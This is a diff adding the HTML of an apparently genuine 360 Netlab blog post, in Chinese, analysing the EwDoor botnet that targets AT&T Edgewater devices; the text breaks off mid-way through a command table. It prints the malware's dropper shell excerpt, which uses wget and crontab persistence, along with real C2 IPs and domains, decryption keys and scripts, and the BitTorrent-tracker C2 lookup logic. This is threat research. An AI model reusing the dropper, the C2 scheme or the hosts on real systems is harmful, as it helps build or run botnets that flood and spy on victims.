@@ -1,0 +1,972 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+
+    <title>EwDoor僵尸网络，正在攻击美国AT&amp;T用户</title>
+    <meta charset="utf-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="HandheldFriendly" content="True" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    
+    <link rel="preload" as="style" href="/assets/built/screen.css?v=00a3abdcf6" />
+    <link rel="preload" as="script" href="/assets/built/casper.js?v=00a3abdcf6" />
+
+    <link rel="stylesheet" type="text/css" href="/assets/built/screen.css?v=00a3abdcf6" />
+
+    <link rel="icon" href="https://blog.netlab.360.com/content/images/size/w256h256/2019/02/netlab_xs-2.png" type="image/png">
+    <link rel="canonical" href="https://blog.netlab.360.com/warning-ewdoor-botnet-is-attacking-att-customers_cn/">
+    <meta name="referrer" content="no-referrer-when-downgrade">
+    
+    <meta property="og:site_name" content="360 Netlab Blog - Network Security Research Lab at 360">
+    <meta property="og:type" content="article">
+    <meta property="og:title" content="EwDoor僵尸网络，正在攻击美国AT&amp;T用户">
+    <meta property="og:description" content="背景介绍
+
+
+2021年10月27日，我们的BotMon系统发现有攻击者正通过CVE-2017-6079漏洞攻击Edgewater Networks设备，其payload里有比较罕见的mount文件系统指令，这引起了我们的兴趣，经过分析，我们确认这是一个全新的僵尸网络家族，基于其针对Edgewater产商、并且有Backdoor的功能，我们将它命名为EwDoor。
+
+
+最初捕获的EwDoor使用了常见的硬编码C2方法，同时采用了冗余机制，单个样本的C2多达14个。Bot运行后会依次向列表中的C2发起网络请求直到成功建立C2会话。这些C2中多数为域名形式，有趣的是它们多数还未来得及注册，因此我们抢注了第二个域名iunno.se以获取Bot的请求。但一开始连接到我们域名的Bot非常少，因为大多数Bot都成功和第一个C2(185.10.68.20)建立连接，这让我们有些许&quot;沮丧&quot;。
+
+
+转机发生在2021年11月8日，当天7点到10点EwDoor的第一个C2185.10.68.20发生了网络故障，瞬间大量Bot连接到我们注册的C2域名，这使得我们成功的测绘了EwDoor僵尸网络的规模&amp;感染范">
+    <meta property="og:url" content="https://blog.netlab.360.com/warning-ewdoor-botnet-is-attacking-att-customers_cn/">
+    <meta property="og:image" content="https://blog.netlab.360.com/content/images/size/w1200/2019/02/astronomy-constellation-dark-998641-4.jpg">
+    <meta property="article:published_time" content="2021-12-01T03:12:04.000Z">
+    <meta property="article:modified_time" content="2026-05-09T07:06:12.000Z">
+    <meta property="article:tag" content="DDoS">
+    <meta property="article:tag" content="Botnet">
+    <meta property="article:tag" content="0-day">
+    <meta property="article:tag" content="Import 2022-11-30 11:16">
+    
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:title" content="EwDoor僵尸网络，正在攻击美国AT&amp;T用户">
+    <meta name="twitter:description" content="背景介绍
+
+
+2021年10月27日，我们的BotMon系统发现有攻击者正通过CVE-2017-6079漏洞攻击Edgewater Networks设备，其payload里有比较罕见的mount文件系统指令，这引起了我们的兴趣，经过分析，我们确认这是一个全新的僵尸网络家族，基于其针对Edgewater产商、并且有Backdoor的功能，我们将它命名为EwDoor。
+
+
+最初捕获的EwDoor使用了常见的硬编码C2方法，同时采用了冗余机制，单个样本的C2多达14个。Bot运行后会依次向列表中的C2发起网络请求直到成功建立C2会话。这些C2中多数为域名形式，有趣的是它们多数还未来得及注册，因此我们抢注了第二个域名iunno.se以获取Bot的请求。但一开始连接到我们域名的Bot非常少，因为大多数Bot都成功和第一个C2(185.10.68.20)建立连接，这让我们有些许&quot;沮丧&quot;。
+
+
+转机发生在2021年11月8日，当天7点到10点EwDoor的第一个C2185.10.68.20发生了网络故障，瞬间大量Bot连接到我们注册的C2域名，这使得我们成功的测绘了EwDoor僵尸网络的规模&amp;感染范">
+    <meta name="twitter:url" content="https://blog.netlab.360.com/warning-ewdoor-botnet-is-attacking-att-customers_cn/">
+    <meta name="twitter:image" content="https://blog.netlab.360.com/content/images/size/w1200/2019/02/astronomy-constellation-dark-998641-4.jpg">
+    <meta name="twitter:label1" content="Written by">
+    <meta name="twitter:data1" content="Alex.Turing">
+    <meta name="twitter:label2" content="Filed under">
+    <meta name="twitter:data2" content="DDoS, Botnet, 0-day, Import 2022-11-30 11:16">
+    <meta name="twitter:site" content="@360Netlab">
+    <meta name="twitter:creator" content="@TuringAlex">
+    <meta property="og:image:width" content="1200">
+    <meta property="og:image:height" content="800">
+    
+    <script type="application/ld+json">
+{
+    "@context": "https://schema.org",
+    "@type": "Article",
+    "publisher": {
+        "@type": "Organization",
+        "name": "360 Netlab Blog - Network Security Research Lab at 360",
+        "url": "https://blog.netlab.360.com/",
+        "logo": {
+            "@type": "ImageObject",
+            "url": "https://blog.netlab.360.com/content/images/2019/02/netlab-brand-5.png"
+        }
+    },
+    "author": {
+        "@type": "Person",
+        "name": "Alex.Turing",
+        "image": {
+            "@type": "ImageObject",
+            "url": "https://blog.netlab.360.com/content/images/size/w1200/2019/06/turing.PNG",
+            "width": 1200,
+            "height": 1200
+        },
+        "url": "https://blog.netlab.360.com/author/alex/",
+        "sameAs": [
+            "https://x.com/TuringAlex"
+        ]
+    },
+    "contributor": [
+        {
+            "@type": "Person",
+            "name": "Hui Wang",
+            "image": {
+                "@type": "ImageObject",
+                "url": "https://blog.netlab.360.com/content/images/2017/05/WechatIMG1.jpeg"
+            },
+            "url": "https://blog.netlab.360.com/author/huiwang/",
+            "sameAs": []
+        }
+    ],
+    "headline": "EwDoor僵尸网络，正在攻击美国AT&amp;T用户",
+    "url": "https://blog.netlab.360.com/warning-ewdoor-botnet-is-attacking-att-customers_cn/",
+    "datePublished": "2021-12-01T03:12:04.000Z",
+    "dateModified": "2026-05-09T07:06:12.000Z",
+    "keywords": "DDoS, Botnet, 0-day, Import 2022-11-30 11:16",
+    "description": "背景介绍\n\n\n2021年10月27日，我们的BotMon系统发现有攻击者正通过CVE-2017-6079漏洞攻击Edgewater Networks设备，其payload里有比较罕见的mount文件系统指令，这引起了我们的兴趣，经过分析，我们确认这是一个全新的僵尸网络家族，基于其针对Edgewater产商、并且有Backdoor的功能，我们将它命名为EwDoor。\n\n\n最初捕获的EwDoor使用了常见的硬编码C2方法，同时采用了冗余机制，单个样本的C2多达14个。Bot运行后会依次向列表中的C2发起网络请求直到成功建立C2会话。这些C2中多数为域名形式，有趣的是它们多数还未来得及注册，因此我们抢注了第二个域名iunno.se以获取Bot的请求。但一开始连接到我们域名的Bot非常少，因为大多数Bot都成功和第一个C2(185.10.68.20)建立连接，这让我们有些许&quot;沮丧&quot;。\n\n\n转机发生在2021年11月8日，当天7点到10点EwDoor的第一个C2185.10.68.20发生了网络故障，瞬间大量Bot连接到我们注册的C2域名，这使得我们成功的测绘了EwDoor僵尸网络的规模&amp;感染范",
+    "mainEntityOfPage": "https://blog.netlab.360.com/warning-ewdoor-botnet-is-attacking-att-customers_cn/"
+}
+    </script>
+
+    <meta name="generator" content="Ghost 6.37">
+    <link rel="alternate" type="application/rss+xml" title="360 Netlab Blog - Network Security Research Lab at 360" href="https://blog.netlab.360.com/rss/">
+    
+    <script defer src="https://cdn.jsdelivr.net/ghost/sodo-search@~1.8/umd/sodo-search.min.js" data-key="1fd4df542dc24426ca7c59275e" data-styles="https://cdn.jsdelivr.net/ghost/sodo-search@~1.8/umd/main.css" data-sodo-search="https://blog.netlab.360.com/" data-locale="en" crossorigin="anonymous"></script>
+    
+    <link href="https://blog.netlab.360.com/webmentions/receive/" rel="webmention">
+    <script defer src="/public/cards.min.js?v=00a3abdcf6"></script><style>:root {--ghost-accent-color: #eca265;}</style>
+    <link rel="stylesheet" type="text/css" href="/public/cards.min.css?v=00a3abdcf6">
+    <style type='text/css'>
+	#ghost-portal-root {
+        display: none;
+    }
+</style>
+
+</head>
+<body class="post-template tag-ddos tag-botnet tag-0-day tag-import-2022-11-30-11-16 tag-hash-import-2026-05-11-03-12 is-head-left-logo has-sans-body has-cover">
+<div class="viewport">
+
+    <header id="gh-head" class="gh-head outer">
+        <div class="gh-head-inner inner">
+            <div class="gh-head-brand">
+                <a class="gh-head-logo" href="https://blog.netlab.360.com">
+                        <img src="https://blog.netlab.360.com/content/images/2019/02/netlab-brand-5.png" alt="360 Netlab Blog - Network Security Research Lab at 360">
+                </a>
+                <button class="gh-search gh-icon-btn" aria-label="Search this site" data-ghost-search><svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2" width="20" height="20"><path stroke-linecap="round" stroke-linejoin="round" d="M21 21l-6-6m2-5a7 7 0 11-14 0 7 7 0 0114 0z"></path></svg></button>
+                <button class="gh-burger" aria-label="Main Menu"></button>
+            </div>
+
+            <nav class="gh-head-menu">
+                <ul class="nav">
+    <li class="nav-botnet"><a href="https://blog.netlab.360.com/tag/botnet/">Botnet</a></li>
+    <li class="nav-dnsmon"><a href="https://blog.netlab.360.com/tag/dnsmon/">DNSMon</a></li>
+    <li class="nav-ddos"><a href="https://blog.netlab.360.com/tag/ddos/">DDoS</a></li>
+    <li class="nav-passivedns"><a href="https://blog.netlab.360.com/tag/pdns/">PassiveDNS</a></li>
+    <li class="nav-mirai"><a href="https://blog.netlab.360.com/tag/mirai/">Mirai</a></li>
+    <li class="nav-dta"><a href="https://blog.netlab.360.com/tag/dta/">DTA</a></li>
+</ul>
+
+            </nav>
+
+            <div class="gh-head-actions">
+                        <button class="gh-search gh-icon-btn" aria-label="Search this site" data-ghost-search><svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2" width="20" height="20"><path stroke-linecap="round" stroke-linejoin="round" d="M21 21l-6-6m2-5a7 7 0 11-14 0 7 7 0 0114 0z"></path></svg></button>
+            </div>
+        </div>
+    </header>
+
+    <div class="site-content">
+        
+
+
+
+<main id="site-main" class="site-main">
+<article class="article post tag-ddos tag-botnet tag-0-day tag-import-2022-11-30-11-16 tag-hash-import-2026-05-11-03-12 no-image ">
+
+    <header class="article-header gh-canvas">
+
+        <div class="article-tag post-card-tags">
+                <span class="post-card-primary-tag">
+                    <a href="/tag/ddos/">DDoS</a>
+                </span>
+        </div>
+
+        <h1 class="article-title">EwDoor僵尸网络，正在攻击美国AT&amp;T用户</h1>
+
+
+        <div class="article-byline">
+        <section class="article-byline-content">
+
+            <ul class="author-list instapaper_ignore">
+                <li class="author-list-item">
+                    <a href="/author/alex/" class="author-avatar" aria-label="Read more of Alex.Turing">
+                        <img class="author-profile-image" src="/content/images/size/w100/2019/06/turing.PNG" alt="Alex.Turing" />
+                    </a>
+                </li>
+                <li class="author-list-item">
+                    <a href="/author/huiwang/" class="author-avatar" aria-label="Read more of Hui Wang">
+                        <img class="author-profile-image" src="/content/images/size/w100/2017/05/WechatIMG1.jpeg" alt="Hui Wang" />
+                    </a>
+                </li>
+            </ul>
+
+            <div class="article-byline-meta">
+                <h4 class="author-name"><a href="/author/alex/">Alex.Turing</a>, <a href="/author/huiwang/">Hui Wang</a></h4>
+                <div class="byline-meta-content">
+                    <time class="byline-meta-date" datetime="2021-12-01">01 Dec 2021</time>
+                        <span class="byline-reading-time"><span class="bull">&bull;</span> 18 min read</span>
+                </div>
+            </div>
+
+        </section>
+        <a href="#/share" class="gh-button gh-button-share">Share</a>
+        </div>
+
+
+    </header>
+
+    <section class="gh-content gh-canvas">
+        <!--kg-card-begin: markdown--><h2 id="">背景介绍</h2>
+<p>2021年10月27日，我们的BotMon系统发现有攻击者正通过CVE-2017-6079漏洞攻击Edgewater Networks设备，其payload里有比较罕见的mount文件系统指令，这引起了我们的兴趣，经过分析，我们确认这是一个全新的僵尸网络家族，基于其针对Edgewater产商、并且有Backdoor的功能，我们将它命名为<strong>EwDoor</strong>。</p>
+<p>最初捕获的EwDoor使用了常见的硬编码C2方法，同时采用了冗余机制，单个样本的C2多达14个。Bot运行后会依次向列表中的C2发起网络请求直到成功建立C2会话。这些C2中多数为域名形式，有趣的是它们多数还未来得及注册，因此我们抢注了第二个域名<code>iunno.se</code>以获取Bot的请求。但一开始连接到我们域名的Bot非常少，因为大多数Bot都成功和第一个C2(185.10.68.20)建立连接，这让我们有些许&quot;沮丧&quot;。</p>
+<p>转机发生在2021年11月8日，当天7点到10点EwDoor的第一个C2<code>185.10.68.20</code>发生了网络故障，瞬间大量Bot连接到我们注册的C2域名，这使得我们成功的测绘了EwDoor僵尸网络的规模&amp;感染范围，数据分析表明<code>被攻击的设备是企业网络边界控制器，属于电信公司AT&amp;T，而且它们地理位置全都在美国</code>。遗憾的是在经历这次C2网络故障问题后，EwDoor的作者可能认识到了这种C2使用方式存在缺陷，放弃了硬编码C2的方式，转而采用BT tracker方式动态下发C2，我们也因此失去了对EwDoor的视野。</p>
+<p>到目前为止，我们视野中的EwDoor经历了3个版本的更新，它的主要功能可以总结成DDoS攻击和Backdoor 2大类，基于被攻击设备和电话通信相关，我们推测它的主要目的就是<strong>DDoS攻击，和窃取敏感信息</strong>，如call log等。</p>
+<p>鉴于EwDoor的规模，活跃性，被攻击设备本身以及其所属国家的敏感性，我们决定撰写本文向社区分享我们的发现，共同维护网络安全。</p>
+<h2 id="">时间线</h2>
+<ul>
+<li>2021年10月27日，首次捕获EwDoor，版本号为0.12.0，主要功能为DDoS Attack，File Manager，Reverse Shell，Port Scan等。</li>
+<li>2021年11月8日，EwDoor更新，版本号为0.15.0，将C2从本地移向云端，使用BT Tracker。</li>
+<li>2021年11月15日，EwDoor更新，版本号为0.16.0，代码结构变化属于微调级别，加入沙箱对抗功能。</li>
+<li>2021年11月20日，EwDoor更新，版本号为0.16.0，代码结构变化属于微调级别，BT Trackers有些许变化。</li>
+</ul>
+<h2 id="ewdoor">EwDoor概述</h2>
+<p>我们一共捕获了3个版本的EwDoor，以版本0.16.0为蓝本，可以将EwDoor定性为，一个通过BT tracker下发C2，使用TLS保护流量，主要盈利手段为DDoS攻击，敏感数据盗取的僵尸网络，目前它通过Nday漏洞CVE_2017_6079传播，主要针对网络电话网关设备。</p>
+<p>目前支持6大功能：</p>
+<ul>
+<li>自升级</li>
+<li>端口扫描</li>
+<li>文件管理</li>
+<li>DDoS攻击</li>
+<li>反弹SHELL</li>
+<li>执行任意命令</li>
+</ul>
+<p>它的基本流程图如下所示：</p>
+<img src="https://blog.netlab.360.com/content/images/2021/11/ew_briefproc.png"  width="860px" />
+<h2 id="">规模</h2>
+<p>通过抢注作者未注册的CC域名，我们有一段时间看到了这个Botnet的规模，当时活跃Bot IP 6k左右。被感染设备IP的AS号全部为<code>AS7018|AT&amp;T_Services,_Inc.</code>(美国电信公司AT&amp;T)。通过反查这些设备使用的SSl证书，我们发现使用相同SSl证书的IP有10万左右，我们不清楚这些IP对应的设备有多少可被感染，但可以推测他们可能属于同一类设备，有被感染风险。<br>
+<img src="https://blog.netlab.360.com/content/images/2021/11/ew.door.sip.png" alt="ew.door.sip" loading="lazy"></p>
+<h2 id="shell">shell脚本分析</h2>
+<p>EwDoor的前置SHELL脚本比较长，我们摘取了关键部分以供分析。</p>
+<pre><code>setup_ramdisk() {
+    dd if=/dev/zero of=$RAMDISK bs=4096k count=1
+    gunzip -c $IMAGE &gt; $RAMDISK
+    mkdir -p $MOUNT
+    mount $RAMDISK $MOUNT
+}
+
+download_update() {
+    killall -9 ewstat
+    sleep $[ ( $RANDOM % 10 ) + 1 ]
+    rm -f $IMAGE
+    rm -f $EW_BIN
+    wget -O $IMAGE $1
+
+    grep &quot;$EW_BIN&quot; /etc/config/crontab &gt;/dev/null 2&gt;&amp;1
+
+    # is it not already in the crontab?
+    if [ $? != 0 ]; then
+        echo &quot;* * * * * root $EW_BIN &gt;/dev/null 2&gt;&amp;1 &amp;&quot; &gt;&gt; /etc/config/crontab
+    fi
+
+    sleep 1
+
+    cfg_commit
+}
+</code></pre>
+<p>可以看出SHELL脚本的主要功能为：</p>
+<ul>
+<li>下载执行EwDoor样本</li>
+<li>设置Crontab，实现持久化</li>
+</ul>
+<p>另外值得一提的是EwDoor样本以gzip的形式存放在下载服务器，这在一定程度在逃避了网络规则对2进制文件的查杀；早期版本作者将样本文件制作成<code>Linux rev 1.0 ext2 filesystem</code>文件，然后使用mount这种方式将文件挂载到系统里，这可能也是为了免杀。</p>
+<h2 id="">样本分析</h2>
+<p>本文选取最新版0.16为主要分析对象，它的基本信息如下所示：</p>
+<pre><code>MD5:7d4937e27d0fd75dd6159ffe53ebb505
+ELF 32-bit MSB executable, MIPS, MIPS-I version 1 (SYSV), dynamically linked, interpreter /lib/ld-uClibc.so.0, stripped
+Packer:none
+Version: 0.16.0
+</code></pre>
+<p>Ewdoor使用动态链接的方式，虽然使用了一些对抗技巧，但在逆向上没有太多难度。总体来说，功能比较简单，当它在被侵入设备运行时，首先会收集设备信息，实现比较常见的的单一实例，持久化等功能；然后解密出bt tracker，通过访问bt tracker获取C2；最后向C2上报收集到的设备信息，执行C2下发的指令。下文将从对抗技巧，主机行为和网络通信3方面，一一剖析的ewdoor的实现。</p>
+<h2 id="">对抗技巧</h2>
+<ul>
+<li>
+<p>网络层面使用TLS协议，防止通信被一眼看穿</p>
+</li>
+<li>
+<p>敏感的资源都被加密，增加逆向难度</p>
+</li>
+<li>
+<p>C2从本地移到“云端”，由BT tracker下发，防止被IOC系统直接提取</p>
+</li>
+<li>
+<p><strong>修改ELF中的&quot;ABIFLAGS&quot; PHT</strong>，以对抗qemu-user，以及一些高内核版本的Linux沙箱。这是一种比较少见的对抗技巧，这说明EwDoor的作者对Linux内核，QEMU，以及Edgewater设备都非常熟悉。<br>
+<img src="https://blog.netlab.360.com/content/images/2021/11/ew_abi.png" alt="ew_abi" loading="lazy"><br>
+在实际使用qemu-user进行模拟运行时会产生以下错误提示：</p>
+<pre><code>write(2, &quot;/tmp/echuysqs: Invalid PT_MIPS_ABIFLAGS entry\n&quot;, 46)
+</code></pre>
+</li>
+</ul>
+<h2 id="">主机行为</h2>
+<p>Ewdoor运行时，会对文件名，参数进行检测。当文件名为&quot;/var/tmp/.mnt/ewupdate&quot;，说明这次是更新操作，此时会通过命令<code>cp -f /var/tmp/.mnt/ewupdate /var/tmp/.mnt/ewstat</code>，把自身复制成ewstat再启动执行；当没有启动参数，或第一个启动不为<code>script</code>时，则通过bash执行<code>/etc/config/ew.conf</code>脚本；只有当第一个启动数据为script时，才会执行下文的处理逻辑，这在某种程度上也是对沙箱/模拟器的一种对抗。</p>
+<h3 id="">单一实例</h3>
+<p>Ewdoor通过文件锁来实现单一实例，具体实现如下所示：</p>
+<img src="https://blog.netlab.360.com/content/images/2021/11/ew_single.png"  width="860px" />
+<p>我们可以通过<code>/proc/locks</code>将进程以及文件锁对应起来，此时再执行对应的EwDoor的样本，可以看到并不会有新进程被创建。</p>
+<img src="https://blog.netlab.360.com/content/images/2021/11/ew_singemp.png"  width="860px" />
+<h3 id="">收集设备信息</h3>
+<p>Ewdoor收集被侵入设备的主机名，网卡地址等信息以供后面的上线过程使用。</p>
+<img src="https://blog.netlab.360.com/content/images/2021/11/ew_host.png"  width="860px" />
+<h3 id="">持久化</h3>
+<p>Ewdoor通过下面代码，定期结束系统中的netflash进程，netflash命令是一个维护命令，用于远程更新系统。Ewdoor通过阻断维护通道，再配合SHELL脚本中crontab，实现持久化。</p>
+<img src="https://blog.netlab.360.com/content/images/2021/11/ew_persist.png"  width="860px" />
+<h2 id="">网络通信</h2>
+<p>Ewdoor将网络相关的敏感信息，诸如上线信息，C2，端口等加密存储在样本中。因此要进行网络通信时，首先得解密得到这部分资源，然后通过直接或间接的方式获取到C2，最后和C2建立通信，等待执行C2下发的指令。</p>
+<h3 id="">解密</h3>
+<p>Ewdoor使用了3张表来描述加密的资源，一张为密文表，一张为密文长度表，一张为组合表。其中密文&amp;密文长度表是用来描述加密资源本身，而组合表则是用来描述资源如何被组合使用。通过密文表和密文长度而可以解密出BT domain, BT port等信息；通过组合表则可以将BT domain&amp;port 组合成BT tracker。</p>
+<p>EwDoor通过“gstr”函数解密敏感信息，它的实现如下所示：</p>
+<img src="https://blog.netlab.360.com/content/images/2021/11/ew_gstr.png"  width="860px" />
+<p>经过逆向分析之后，我们编写了以下IDA脚本，通过它可以解密得到所有的资源信息。</p>
+<pre><code># tested in ida 7.0, only for md5 7d4937e27d0fd75dd6159ffe53ebb505
+
+pbuf_base=0x00467014
+plen_base=0x00455A14
+
+key=&quot;холодно в доме папа в тужурке мама дочуркою топит в печурке!&quot;
+cnt=0
+
+while idc.get_wide_dword(plen_base)!=0:
+    plain=''
+    blen=idc.get_wide_dword(plen_base)
+    pbuf=idc.get_wide_dword(pbuf_base)
+    buf=idc.get_bytes(pbuf,blen)
+    for i in range(blen):
+        tmp=chr(ord(buf[i])^cnt ^ ord(key[i % len(key)]))
+        plain+=tmp
+        
+    print plain
+    plen_base+=4
+    pbuf_base+=4
+    cnt+=1
+    if cnt &gt;=62:
+        break
+</code></pre>
+<p>加密资源一共有62项，解密后的前22项如下所示：</p>
+<table>
+<thead>
+<tr>
+<th>index</th>
+<th>Item</th>
+<th>index</th>
+<th>item</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>0</td>
+<td>OrOib2zCIWa10v2bunJ</td>
+<td>11</td>
+<td>tracker.birkenwald.de</td>
+</tr>
+<tr>
+<td>1</td>
+<td>6969</td>
+<td>12</td>
+<td>ipv6.tracker.zerobytes.xyz</td>
+</tr>
+<tr>
+<td>2</td>
+<td>53</td>
+<td>13</td>
+<td>fe.dealclub.de</td>
+</tr>
+<tr>
+<td>3</td>
+<td>1337</td>
+<td>14</td>
+<td>wassermann.online</td>
+</tr>
+<tr>
+<td>4</td>
+<td>80</td>
+<td>15</td>
+<td>mail.realliferpg.de</td>
+</tr>
+<tr>
+<td>5</td>
+<td>451</td>
+<td>16</td>
+<td>movies.zsw.ca</td>
+</tr>
+<tr>
+<td>6</td>
+<td>2770</td>
+<td>17</td>
+<td>tracker.blacksparrowmedia.net</td>
+</tr>
+<tr>
+<td>7</td>
+<td>16661</td>
+<td>18</td>
+<td>code2chicken.nl</td>
+</tr>
+<tr>
+<td>8</td>
+<td>2710</td>
+<td>19</td>
+<td>abufinzio.monocul.us</td>
+</tr>
+<tr>
+<td>9</td>
+<td>2960</td>
+<td>20</td>
+<td>tracker.0x.tf</td>
+</tr>
+<tr>
+<td>10</td>
+<td>3391</td>
+<td>21</td>
+<td>tracker.altrosky.nl</td>
+</tr>
+</tbody>
+</table>
+<p>样本中内置的组合表如下所示：</p>
+<img src="https://blog.netlab.360.com/content/images/2021/11/ew_restab.png"  width="860px" />
+<p>组合表以2项为一组，按顺序组合，即表项11和表项1组合，表项12和表项7组合，依此类推。以[11，1]，[12，7]的组合方式为例，分别得到2个BT tracker的地址&quot;tracker.birkenwald.de :6969&quot;，&quot;ipv6.tracker.zerobytes.xyz:16661&quot;。</p>
+<h2 id="c2">获取C2</h2>
+<p>EwDoor在不同的版本，获取C2的方式不一样，在版本0.12.0时，采用直接方式；而在0.15，0.16则采用间接方式。</p>
+<h3 id="">直接方式</h3>
+<p>所谓直接方式，即经过上文的解密流程后，直接就得到了C2。以样本<code>5d653e9a5b1093ef8408c3884fbd9217</code>为例，通过下面的IDA脚本，解密所有加密资源。</p>
+<pre><code># tested in ida 7.0, only for md5 5d653e9a5b1093ef8408c3884fbd9217
+pbuf_base=0x00467814
+plen_base=0x00456100
+
+key=&quot;TheMagicalMysteryTourIsComingToTakeYouAway!&quot;
+cnt=0
+while idc.get_wide_dword(plen_base)!=0:
+    plain=''
+    blen=idc.get_wide_dword(plen_base)
+    pbuf=idc.get_wide_dword(pbuf_base)
+    buf=idc.get_bytes(pbuf,blen)
+    for i in range(blen):
+        tmp=chr(ord(buf[i])^cnt ^ ord(key[i % len(key)]))
+        plain+=tmp
+        
+    print plain
+    plen_base+=4
+    pbuf_base+=4
+    cnt+=1
+    if cnt&gt;=18:
+        break
+</code></pre>
+<p>解密后资源如下表所示，表项1到14为C2，表项15到17为port。</p>
+<table>
+<thead>
+<tr>
+<th>Index</th>
+<th>Item</th>
+<th>Index</th>
+<th>Item</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>0</td>
+<td>F0JEAADWS4kQFj7iPOQyjA</td>
+<td>9</td>
+<td>rtmxvd.iunno.se</td>
+</tr>
+<tr>
+<td>1</td>
+<td>185.10.68.20</td>
+<td>10</td>
+<td>hhqnyy.zapto.org</td>
+</tr>
+<tr>
+<td>2</td>
+<td>rtmxvd.iunno.se</td>
+<td>11</td>
+<td>besthatsite.mooo.com</td>
+</tr>
+<tr>
+<td>3</td>
+<td>ekgmua.zapto.org</td>
+<td>12</td>
+<td>b.rtmxvdio.ne</td>
+</tr>
+<tr>
+<td>4</td>
+<td>boatreviews.xpresit.net</td>
+<td>13</td>
+<td>b.hatbowlu3hf.ru</td>
+</tr>
+<tr>
+<td>5</td>
+<td>a.rtmxvdio.net</td>
+<td>14</td>
+<td>b.hatbowlrtx.su</td>
+</tr>
+<tr>
+<td>6</td>
+<td>a.hatbowlu3hf.ru</td>
+<td>15</td>
+<td>13433</td>
+</tr>
+<tr>
+<td>7</td>
+<td>a.hatbowlrtx.su</td>
+<td>16</td>
+<td>443</td>
+</tr>
+<tr>
+<td>8</td>
+<td>45.141.157.217</td>
+<td>17</td>
+<td>53</td>
+</tr>
+</tbody>
+</table>
+<h3 id="">间接的方式</h3>
+<p>所谓间接方式，即经过上文解密流程后得到的是BT tracker，必须通过向BT tracker发现特定的请求，才能得到C2，这个过程用到了2个函数“bt_generate_daily_hash_and_port”和“bt_try_find_good_peers”，前者用于获取C2的端口，后者用于获取C2的IP。</p>
+<p><code>bt_generate_daily_hash_and_port</code>函数的实现如下所示，具体逻辑是将当前时间按“%d%m%Y”格式化后，和&quot;1HAT2BWL&quot;进行拼接，接着计算这个字串的SHA1值，再将SHA1的最后2字节进行运算得到C2的端口。</p>
+<img src="https://blog.netlab.360.com/content/images/2021/11/ew_bthash.png"  width="860px" />
+<p>事实上上面这一步骤计算得到的端口，并非真正的端口值，它还需要加上10。这个过程如下图所示：</p>
+<img src="https://blog.netlab.360.com/content/images/2021/11/ew_port.png"  width="860px" />
+<p><code>bt_try_find_good_peers</code>函数的实现如下所示，具体逻辑是将上文的字串SHA1值作为infohash发送给bt tracker，通过Tracker UDP协议得到C2:PORT，如果PORT等于上文的端口值，则此IP就是C2的IP。</p>
+<img src="https://blog.netlab.360.com/content/images/2021/11/ew_bt.png"  width="860px" />
+<p>以下图2021.11.22日产生的网络流量为例：</p>
+<img src="https://blog.netlab.360.com/content/images/2021/11/ew_udp.png"  width="860px" />
+<p>红色部分为字串&quot;1HAT2BWL22112021&quot;的SHA1值，它最后2字节为0x23a2，它通过以下的代码运算后，就得到了C2的端口“0xc6fc”。</p>
+<pre><code>sha18=0x23
+sha19=0xa2
+
+def tohex(val, nbits):
+  return hex((val + (1 &lt;&lt; nbits)) % (1 &lt;&lt; nbits))
+port=sha19+((sha18&amp;0xf)&lt;&lt;8)-15536+10
+
+print tohex(port,16)
+</code></pre>
+<p>将上面计算得到的SHA1值作为infohash发送给BT tracker，再比较BT tracker返回的服务器端口，可以看出有3组的端口都是0xcff6，任选一组建立通信。</p>
+<pre><code>2d 8d 9b d9 : c6fc  -&gt; 45.141.155.217:50940
+3e 4d 9c 67 : c6fc  -&gt; 62.77.156.103:50940
+d4 c0 f1 9e : c6fc  -&gt; 212.192.241.158:50940
+</code></pre>
+<p>实际网络连接情况如下所示：</p>
+<img src="https://blog.netlab.360.com/content/images/2021/11/ew_net.png"  width="860px" />
+<h2 id="c2">和C2通信</h2>
+<p>当Ewdoor成功获得C2后，首先通过TLS协议建立连接，然后将上线信息发送给C2，最后等待执行C2下发的指令。这个过程，根据版本的不同，和C2的通信协议可以分成以下俩大类。</p>
+<h3 id="012versionprotocol">0.12 version protocol</h3>
+<ul>
+<li>
+<p>TLS连接</p>
+<p>TLS连接本身并不值得一说，有意思的点是在0.12的版本中，Ewdoor的作者犯过错误。如下图所示，在0.12版本，Ewdoor通过resolve_and_connect_first解密C2，和C2建立连接。其中参数a1,a2的值来看自res_range，要求a2&gt;=a1才会执行解密，连接这个过程。样本5d653e9a5b1093ef8408c3884fbd9217中a1=8,a2=7，这就产生了BUG，导致编号8到14的C2永远不会被连接，不过Ewdoor的作者很快就意识到了这个Bug，在样本6c553db88e4cd52a2ed4795ec1710421中就修复了。</p>
+<img src="https://blog.netlab.360.com/content/images/2021/11/ew_c2bug.png"  width="860px" />
+</li>
+<li>
+<p>上线</p>
+<p>通过以下代码构造上线包，上线数据里包括从index 0解密出的字串，版本号，设备主机名，设备网卡地址等信息。</p>
+<img src="https://blog.netlab.360.com/content/images/2021/11/ew_regv1.png"  width="860px" />
+<p>实际产生的流量如下所示：</p>
+<pre><code>00000000  48 45 4c 4f 20 30 2e 31  32 2e 30 20 46 30 4a 45  |HELO 0.12.0 F0JE|
+00000010  41 41 44 57 53 34 6b 51  46 6a 37 69 50 4f 51 79  |AADWS4kQFj7iPOQy|
+00000020  6a 41 20 64 65 62 69 61  6e 2d 6d 69 70 73 20 31  |jA debian-mips 1|
+00000030  32 33 34 35 36 0a                                 |23456.|
+</code></pre>
+</li>
+<li>
+<p>支持的指令</p>
+<p>成功上线后，Ewdoor等待执行C2下发的指令，0.12版本支持的指令如下表所示：</p>
+<table>
+<thead>
+<tr>
+<th>cmd</th>
+<th>purpose</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>uf</td>
+<td>udp flood</td>
+</tr>
+<tr>
+<td>sf</td>
+<td>syn flood</td>
+</tr>
+<tr>
+<td>cat</td>
+<td>exec &quot;cat&quot; cmd</td>
+</tr>
+<tr>
+<td>ping</td>
+<td>heartbeat</td>
+</tr>
+<tr>
+<td>exec</td>
+<td>run cmd via bash</td>
